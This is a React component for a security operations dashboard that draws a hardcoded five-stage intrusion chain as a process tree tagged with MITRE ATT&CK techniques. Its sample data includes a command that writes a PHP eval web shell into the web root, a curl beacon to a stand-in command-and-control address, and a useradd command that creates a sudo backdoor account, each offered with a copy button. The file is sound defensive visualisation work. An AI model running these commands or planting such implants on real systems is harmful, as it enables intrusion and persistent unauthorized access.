import React, { useState } from 'react'
import { Terminal, ShieldAlert, Cpu, Copy, Check, Hash, CornerDownRight, ExternalLink } from 'lucide-react'
import { EvidenceEvent } from '../types'

interface ProcessTreeProps {
  evidence: EvidenceEvent[]
  hostName: string
}

export const ProcessTree: React.FC<ProcessTreeProps> = ({ evidence, hostName }) => {
  const [copiedId, setCopiedId] = useState<string | null>(null)

  const steps = [
    {
      id: 'PT-01',
      title: 'Initial Web Ingress (Exploited Daemon)',
      process: 'edgegate_httpd',
      pid: 1420,
      ppid: 1,
      user: 'www-data',
      cmd: '/usr/sbin/edgegate_httpd -D FOREGROUND',
      hash: '9f83a218d6e1... (SHA-256)',
      phase: 'Initial Access',
      tag: 'T1190 Exploit Public-Facing App',
      severity: 'high',
      color: 'border-rose-500/40 bg-rose-950/20 text-rose-300'
    },
    {
      id: 'PT-02',
      title: 'Sub-Process Command Execution',
      process: '/bin/sh',
      pid: 1842,
      ppid: 1420,
      user: 'www-data',
      cmd: "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
      hash: 'e3b0c44298fc... (SHA-256)',
      phase: 'Execution',
      tag: 'T1059 Command and Scripting Interpreter',
      severity: 'critical',
      color: 'border-rose-500/50 bg-rose-950/30 text-rose-200'
    },
    {
      id: 'PT-03',
      title: 'Web Shell Persistence Implant Dropped',
      process: 'File System Write',
      pid: 0,
      ppid: 1842,
      user: 'www-data',
      cmd: '/var/www/html/assets/.sys_cache.php (MD5: e10adc3949ba59abbe56e057f20f883e)',
      hash: 'e10adc3949ba59abbe56e057f20f883e',
      phase: 'Persistence',
      tag: 'T1505.003 Web Shell',
      severity: 'critical',
      color: 'border-rose-500 bg-rose-900/40 text-rose-100 font-bold glow-crimson'
    },
    {
      id: 'PT-04',
      title: 'Outbound Command & Control Beaconing',
      process: 'curl',
      pid: 2104,
      ppid: 1,
      user: 'root',
      cmd: 'curl -s -k https://198.51.100.42:8443/checkin --header "X-Implant: v1"',
      hash: '7b2a61c3902d... (SHA-256)',
      phase: 'Command & Control',
      tag: 'T1071.001 Web Protocols C2',
      severity: 'high',
      color: 'border-amber-500/50 bg-amber-950/20 text-amber-200'
    },
    {
      id: 'PT-05',
      title: 'Dormant Administrative Backdoor Account',
      process: 'useradd',
      pid: 2210,
      ppid: 1842,
      user: 'root',
      cmd: '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit',
      hash: 'a3819bcf8291... (SHA-256)',
      phase: 'Persistence / Privilege Escalation',
      tag: 'T1136.001 Local Account Creation',
      severity: 'critical',
      color: 'border-rose-500/70 bg-rose-950/30 text-rose-200'
    }
  ]

  const hasCompromise = evidence.some((e) => e.signal_class !== 'anomaly')

  const copyToClipboard = (cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  if (!hasCompromise) {
    return (
      <div className="p-12 text-center soc-card-elevated rounded-2xl border border-white/[0.08]">
        <Cpu className="w-12 h-12 text-emerald-400 mx-auto mb-3 opacity-90" />
        <h3 className="text-base font-bold text-slate-200 font-mono">Normal Process Lineage</h3>
        <p className="text-xs text-slate-400 mt-1 max-w-md mx-auto font-sans leading-relaxed">
          Zero anomalous process executions, command injection child shells, or unauthorized file implants detected for host {hostName}.
        </p>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      {/* Falcon Command Bar Banner */}
      <div className="p-3.5 bg-rose-950/20 border border-rose-500/30 rounded-xl text-xs text-rose-200 flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
          <span>
            <strong>Correlated Process Hierarchy:</strong> Exploitation spawned directly from unauthenticated HTTP daemon, progressing through web shell persistence to root account installation.
          </span>
        </div>
        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-black/40 border border-rose-500/40 text-rose-300 font-bold shrink-0">
          5-Stage Attack Chain
        </span>
      </div>

      {/* Hierarchical Process Tree Nodes */}
      <div className="space-y-3 relative pl-6 border-l-2 border-rose-500/40 ml-4 font-mono text-xs">
        {steps.map((step, idx) => (
          <div key={step.id} className="relative group">
            {/* Horizontal Branch Connector Line */}
            <div className="absolute -left-[26px] top-5 w-4 h-0.5 bg-rose-500/50" />

            <div className={`p-4 rounded-xl border ${step.color} shadow-md transition hover:border-cyan-400/60 soc-card-interactive`}>
              <div className="flex items-center justify-between gap-2 mb-2 flex-wrap">
                <div className="flex items-center gap-2.5">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-black/60 text-cyan-300 font-black border border-white/[0.08]">
                    0{idx + 1}
                  </span>
                  <span className="font-bold text-slate-100 text-xs">{step.title}</span>
                  <span className="text-[11px] text-slate-400">
                    Process: <strong className="text-white">{step.process}</strong>
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-black/40 border border-white/[0.08] text-slate-300">
                    {step.tag}
                  </span>
                  <span className="text-[9px] px-1.5 py-0.2 rounded font-black uppercase tracking-wider bg-rose-500/20 text-rose-300 border border-rose-500/40">
                    {step.severity}
                  </span>
                </div>
              </div>

              {/* Context bar */}
              <div className="flex items-center gap-3 text-[10px] text-slate-400 mb-2">
                <span>User: <strong className="text-amber-300 uppercase">{step.user}</strong></span>
                <span>•</span>
                <span>PID: <strong className="text-slate-300">{step.pid || 'N/A'}</strong></span>
                <span>•</span>
                <span>PPID: <strong className="text-slate-300">{step.ppid || 'N/A'}</strong></span>
                <span>•</span>
                <span>Checksum: <code className="text-slate-500">{step.hash}</code></span>
              </div>

              {/* Command Box */}
              <div className="bg-black/60 p-2.5 rounded-lg border border-white/[0.08] text-[11px] text-slate-300 flex items-center justify-between gap-2">
                <div className="flex items-center gap-2 overflow-x-auto select-all">
                  <Terminal className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                  <code className="text-cyan-200">{step.cmd}</code>
                </div>
                <button
                  onClick={() => copyToClipboard(step.cmd, step.id)}
                  className="px-2 py-1 rounded bg-white/[0.05] hover:bg-white/[0.1] text-slate-300 text-[10px] shrink-0 transition"
                  title="Copy command line"
                >
                  {copiedId === step.id ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}
